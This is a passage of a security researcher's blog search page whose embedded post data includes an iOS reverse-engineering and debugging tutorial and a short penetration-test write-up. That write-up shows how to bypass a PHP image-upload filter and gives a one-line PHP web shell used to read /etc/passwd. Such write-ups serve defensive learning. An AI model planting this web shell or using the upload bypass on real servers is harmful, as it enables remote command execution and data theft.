id=\"setup\"\u003eSetup\u003c/h2\u003e\n\n\u003cp\u003eOur domain will be at lateralus.uk\u003c/p\u003e\n",
                    "name": "lateralus.html"
                },
            
                {
                    "title": "Fun RCE with PHP upload",
                    "description": "500 Internal Error sometimes can be good",
                    "content": "\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eI know this is not about MacOS nor iOS but this was something that had to be written.\u003c/p\u003e\n\n\u003cp\u003eRecently I had a web application penetration test on which I have found CSV injection and a great example of bypassing PHP image upload. Users with admin privileges had an option to change user\u0026rsquo;s profile picture which immediately caught my eye.\u003c/p\u003e\n\n\u003ch2 id=\"app-details\"\u003eApp details\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eFictional hostname: example.com\u003c/li\u003e\n\u003cli\u003eLanguage: PHP\u003c/li\u003e\n\u003cli\u003eFramework: Laravel\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\n\u003cp\u003eAfter messing around with trying to upload some php shell I was constantly getting 500 Internal Server Error which was kinda a clue to me that application is not allowing anything besides good ol\u0026rsquo; images.\u003c/p\u003e\n\n\u003cp\u003eApplication is storing images on the server by generating random id and combining it with file extension. It gets stored at \u003cstrong\u003e\u003ca href=\"http://example.com/images/users/ID.EXTENSION\"\u003ehttp://example.com/images/users/ID.EXTENSION\u003c/a\u003e\u003c/strong\u003e.\u003c/p\u003e\n\n\u003cp\u003eExample: \u003cstrong\u003e\u003ca href=\"http://example.com/images/users/1191723995f3a343b45e2d9.82154619.jpg\"\u003ehttp://example.com/images/users/1191723995f3a343b45e2d9.82154619.jpg\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch2 id=\"attack\"\u003eAttack\u003c/h2\u003e\n\n\u003cp\u003eI first have tried to upload php file and change its filename to name.gif.php and embeding some PHP code without success. File gets uploaded as php but without execution which can be seen on following image.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eAfter inspecting elements, I saw that file got saved as \u003cstrong\u003e864064135f3a686e303ab8.04907479.php\u003c/strong\u003e, after checking with browser the location I saw only GIF87a; on the page.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eThe thing which caught my attention was 500 Internal Server Error even though the file got uploaded.\u003c/p\u003e\n\n\u003cp\u003eThe next thing i have tried is removing completely \u003cem\u003eGIF87a;\u003c/em\u003e, changing mime type to \u003cstrong\u003eapplication/x-httpd-php\u003c/strong\u003e and filename just to \u003cstrong\u003e.gif.php\u003c/strong\u003e. Application stripped .gif and saved php file, inspecting the element and checking the URL I saw that PHP file really got executed. Once again I got 500 Internal Server Error but the file got uploaded so I didn\u0026rsquo;t really care.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eChanging the body to \u003ccode\u003e\u0026lt;?php system($_GET[\u0026quot;cmd\u0026quot;]); ?\u0026gt;\u003c/code\u003e, uploading the file, getting the URL I have proceeded to get file \u003cstrong\u003e/etc/passwd/\u003c/strong\u003e with success and it is game over.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003ch2 id=\"point-of-the-post\"\u003ePoint of the post\u003c/h2\u003e\n\n\u003cp\u003eDo not get discouraged if you get internal server error, try to mess around and play with everything you see. You never know what the application is doing when you are blackboxing.\u003c/p\u003e\n",
                    "name": "rce.html"
                },
            
                {
                    "title": "Connecting the dots between Theos and Cycript/Cyrun",
                    "description": "What is the releationship between the two",
                    "content": "\u003cp\u003eWe have all been playing with cycript and changing those labels or perhaps we hid some views but we did not see the bigger picture of all of it, and the biggest question of them all is how it is related to \u003cstrong\u003eclass-dump\u003c/strong\u003e and \u003cstrong\u003etheos\u003c/strong\u003e. To make things clear, im gonna take local news app.\u003c/p\u003e\n\n\u003ch2 id=\"theos\"\u003eTheos\u003c/h2\u003e\n\n\u003cp\u003eLets take definition from \u003ca href=\"http://iphonedevwiki.net/index.php/Theos\"\u003eiphonedevwiki\u003c/a\u003e which says:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eTheos is a cross-platform suite of development tools for managing, developing, and deploying iOS software without the use of Xcode.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eWhat this means is that you can override certain app funcionality, extend it or remove it completely. Result of theos is called \u003cem\u003etweak\u003c/em\u003e. Let\u0026rsquo;s say you have a functionality in app which shows advertisements, you could make a theos tweak (override method) not to show those advertisements.\u003c/p\u003e\n\n\u003ch2 id=\"class-dump\"\u003eClass-dump\u003c/h2\u003e\n\n\u003cp\u003eClass-dump tool or alternative version class-dump-z which is faster is basically what its name says. It allows you to dump all classes as well as their methods inside the specific app binary. I like to install it on my Mac and run everything from there because it is easier for me. The first thing I do is dump application using tools like \u003cstrong\u003efrida-ios-dump\u003c/strong\u003e or \u003cstrong\u003eClutch\u003c/strong\u003e, extract the \u003cem\u003e.ipa\u003c/em\u003e file and run the class-dump against the binary.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026rsquo;s say app\u0026rsquo;s binary is called \u003cem\u003eNotMe\u003c/em\u003e, good combination of flags would be:\u003cbr\u003e\n\u003ccode\u003e$ class-dump -S -s -H NotMe -o /tmp/NotMeHeaders\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eRun \u003ccode\u003eclass-dump --help\u003c/code\u003e to see what each options means.\u003c/p\u003e\n\n\u003ch2 id=\"cycript-or-cyrun-what-the-hell\"\u003eCycript or cyrun, what the hell\u003c/h2\u003e\n\n\u003cp\u003eThe name of the original tool is called \u003cstrong\u003ecycript\u003c/strong\u003e which was made by saurik himself. On certain versions of jailbreak cycript does not work, and there is alternative called \u003cem\u003ecyrun\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003eCycript enables you to attach to the application and inspect it in runtime. You can view all those views, labels, textfields etc. You can manipulate those elements however you want according to ObjC rules. Cycript is also useful to find which view controller is responsible for certain element, or which methods gets called on let\u0026rsquo;s say button click.\u003c/p\u003e\n\n\u003ch2 id=\"connecting-everything\"\u003eConnecting everything\u003c/h2\u003e\n",
                    "name": "theos_cycript_cyrun.html"
                },
            
                {
                    "title": "Debugging iOS apps on jailbroken iPhone",
                    "description": "LLDB + debugserver to debug iOS apps",
                    "content": "\u003cp\u003eThe first time I have tried to debug iOS apps on my jailbroken iPhone I hit the wall. There were many issues I had to solve so in this short post I\u0026rsquo;m gonna try to help you with this. Since you came to this post, I believe you already know what is lldb so I won\u0026rsquo;t talk about it and let\u0026rsquo;s get straight to the point.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePrerequisites:\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eJailbroken iPhone (mine is iPhone 11, 13.4.1)\u003c/li\u003e\n\u003cli\u003eOpenSSH installed and running on iPhone since we will be using \u003ccode\u003escp\u003c/code\u003e to copy files to and from device.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"getting-debugserver-on-device\"\u003eGetting debugserver on device\u003c/h2\u003e\n\n\u003cp\u003eThe first thing you need to do is get \u003ccode\u003edebugserver\u003c/code\u003e on the device. There are generally two ways you can do this:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eUsing hdiutil to attach certain image for your iOS\u003c/li\u003e\n\u003cli\u003eCreating simple blank iOS app in Xcode and deploying it to your device.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eYou can check whether you successfully did any of these methods by checking if there is file \u003ccode\u003e/Developer/usr/bin/debugserver\u003c/code\u003e. If you see it, procede to the next section. Otherwise, repeat steps to get your debugserver on device.\u003c/p\u003e\n\n\u003ch2 id=\"signing-debugserver\"\u003eSigning debugserver\u003c/h2\u003e\n\n\u003cp\u003eThe next thing you want to do is transfer \u003ccode\u003edebugserver\u003c/code\u003e to your Mac. I am using \u003ccode\u003escp\u003c/code\u003e for transfering, you can use any tool you are comfortable with. I am connected to device over usb and \u003cem\u003eiproxy\u003c/em\u003e is up and running on port 2222 (\u003ccode\u003e$ iproxy 2222 22\u003c/code\u003e).\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e$ scp -P 2222 root@localhost:/Developer/usr/bin/debugserver /tmp\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eFor signing debugserver I am using \u003ccode\u003eldid\u003c/code\u003e which came installed with Theos. Create file \u003cstrong\u003eent.xml\u003c/strong\u003e with following content:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-xml\"\u003e\u0026lt;!DOCTYPE plist PUBLIC \u0026quot;-//Apple//DTD PLIST 1.0//EN\u0026quot; \u0026quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026quot;\u0026gt;\n\u0026lt;plist version=\u0026quot;1.0\u0026quot;\u0026gt;\n\u0026lt;dict\u0026gt;\n        \u0026lt;key\u0026gt;com.apple.springboard.debugapplications\u0026lt;/key\u0026gt;\n        \u0026lt;true/\u0026gt;\n        \u0026lt;key\u0026gt;get-task-allow\u0026lt;/key\u0026gt;\n        \u0026lt;true/\u0026gt;\n        \u0026lt;key\u0026gt;task_for_pid-allow\u0026lt;/key\u0026gt;\n        \u0026lt;true/\u0026gt;\n        \u0026lt;key\u0026gt;run-unsigned-code\u0026lt;/key\u0026gt;\n        \u0026lt;true/\u0026gt;\n\u0026lt;/dict\u0026gt;\n\u0026lt;/plist\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eCopy debugserver and ent.xml in the same folder and substitute \u003ccode\u003e/opt/theos\u003c/code\u003e for your install location of Theos.\nAfter creating file, issue \u003ccode\u003e$ /opt/theos/bin/ldid -Sent.xml debugserver\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThen run \u003ccode\u003e$ codesign -s - --entitlements ent.plist -f debugserver\u003c/code\u003e. Copy debugserver back to the device, give it executive permission.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ scp -P 2222 debugserver root@localhost:/usr/bin/debugserver\n$ ssh root@localhost -p 2222\n$ chmod u+x /usr/bin/debugserver\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2 id=\"running-debugserver-and-connecting-with-lldb\"\u003eRunning debugserver and connecting with lldb\u003c/h2\u003e\n\n\u003cp\u003eSpawn another iproxy instance which will be used for lldb connecting like so \u003ccode\u003e$ iproxy 6666 6666\u003c/code\u003e on your mac. Now it is time to run our debugserver, we will be attaching to SpringBoard. Open terminal app on your iPhone or connect over ssh and run \u003ccode\u003e# /usr/bin/debugserver 127.0.0.1:6666 -a SpringBoard\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eYou should see output similar to the one below. Also, your iphone will seems like it is not responding, that is because debugserver is attached to it and waiting for lldb to connect it in order to continue the process.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e# /usr/bin/debugserver 127.0.0.1:6666 -a SpringBoard\ndebugserver-@(#)PROGRAM:LLDB  PROJECT:lldb-900.3.104\n for arm64.\nAttaching to process SpringBoard...\nListening to port 6666 for a connection from localhost...\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAt this point, you should have 2 or 3 tabs open:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eiproxy 2222 22\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eiproxy 6666 6666\u003c/code\u003e - for debugserver\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003essh connection to iphone\u003c/code\u003e - this applies only if you are connecting over ssh to iphone instead of terminal app\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eNow create another terminal tab and type \u003ccode\u003elldb\u003c/code\u003e and then type \u003ccode\u003eprocess connect connect://127.0.0.1:6666\u003c/code\u003e. Output will look something like this:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e(lldb) process connect connect://127.0.0.1:6666\nProcess 6984 stopped\n* thread #1, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP\n    frame #0: 0x000000019c1ac784 libsystem_kernel.dylib`mach_msg_trap + 8\nlibsystem_kernel.dylib`mach_msg_trap:\n-\u0026gt;  0x19c1ac784 \u0026lt;+8\u0026gt;: ret\n\nlibsystem_kernel.dylib`mach_msg_overwrite_trap:\n    0x19c1ac788 \u0026lt;+0\u0026gt;: mov    x16, #-0x20\n    0x19c1ac78c \u0026lt;+4\u0026gt;: svc    #0x80\n    0x19c1ac790 \u0026lt;+8\u0026gt;: ret\nTarget 0: (SpringBoard) stopped.\n(lldb)\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eType \u003cstrong\u003ec\u003c/strong\u003e at lldb prompt to continue process and now your iphone will become responsive again. If you come this far, that means now you know how to debug ios applications on jailbroken iphone using lldb and debugserver. If you have any question, send me an email.\u003c/p\u003e\n",
                    "name": "debugging.html"
                },
            
        ];
        function clearInput() {
           let elem = document.getElementById("search-input");
           elem.value = "";
        }
        function search() {
            let keyword = document.getElementById("search-input").value.toLowerCase().trim();
            let results = document.getElementById("results");
            let foundPosts = [];
            for (i in posts) {
                let title = posts[i].title.toLowerCase();
                let desc = posts[i].description.toLowerCase();
                let content = posts[i].content.toLowerCase();
                if (title.includes(keyword) ||
                desc.includes(keyword) ||
                content.includes(keyword)) {
                    foundPosts.push(posts[i]);
                }
            }
            if (foundPosts.length > 0) {
                let val = "<h3>Found " + foundPosts.length + " results for keyword \"" + document.getElementById("search-input").value + "\"</h3>";
                val += "<ul>";
                for (i in foundPosts) {
                    val += "<li><a href=\"posts/" + foundPosts[i].name + "\"/>" + foundPosts[i].title + "</a></li>";
                }
                val += "</ul>";
                results.innerHTML = val;
            }
        }
    </script>
    
    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
        <div class="container px-4 px-lg-5">
            <a class="navbar-brand" href="#">Home</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                Menu
                <i class="fas fa-bars"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
                <ul class="navbar-nav ms-auto py-4 py-lg-0">
                    <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="index.html">Home</a></li>
                    <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="about.html">About</a></li>
                    
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="pages/cves.html">CVEs</a></li>
                    
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="pages/exploits.html">Vulnerabilities</a></li>
                    
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="pages/resources.html">Resources</a></li>
                    
                    <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="tags.html">Tags</a></li>
                </ul>
            </div>
        </div>
    </nav>
    
    <header class="masthead" style="background-image: url('assets/img/about-bg.jpg')">
        <div class="container position-relative px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <div class="page-heading">
                        <h1>Search in blog posts</h1>
                    </div>
                </div>
            </div>
        </div>
    </header>
    
    <main class="mb-4">
        <div class="container px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <h2 id="posts-count"></h2>
                    <script>
                        let elem = document.getElementById("posts-count");
                        elem.innerHTML = "Searching inside of " + posts.length.toString() + " posts";
                    </script>
                    <div class="input-group">
                        <input class="form-control border-end-0 border rounded-pill" type="text" value="Enter keywords to search..." id="search-input" onfocus="clearInput();">
                        <span class="input-group-append">
                            <button class="btn btn-outline-secondary bg-white border-start-0 border rounded-pill ms-n3" type="button" onclick="search();">
                                <i class="fa fa-search"></i>
                            </button>
                        </span>
                    </div>
                    <div id="results">

                    </div>
                </div>
            </div>
        </div>
    </main>
    
    
        <footer class="border-top">
            <div class="container px-4 px-lg-5">
                <div class="row gx-4 gx-lg-5 justify-content-center">
                    <div class="col-md-10 col-lg-8 col-xl-7">
                        <ul class="list-inline text-center">
                            <li class="list-inline-item">
                                <a href="https://twitter.com/@lateralusd_">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li class="list-inline-item">
                                <a href="https://www.github.com/nsecho">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li class="list-inline-item">
                                <a href="mailto:xdaemonx@protonmail.com">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li class="list-inline-item">
                                <a href="https://nsecho.github.io//index.xml">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                        </ul>
                        <div class="small text-center text-muted fst-italic">Copyright &copy; NSEcho 2024</div>
                        <div class="small text-center text-muted fst-italic">Made with <a href="https://github.com/lateralusd/bloggy">bloggy</a></div>
                    </div>
                </div>
            </div>
        </footer>
        <style>
            .ct > p img {
                height: 100%;
                width: 100%;
            }
        </style>

    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    
    <script src="js/scripts.js"></script>
    </body>
    </html>
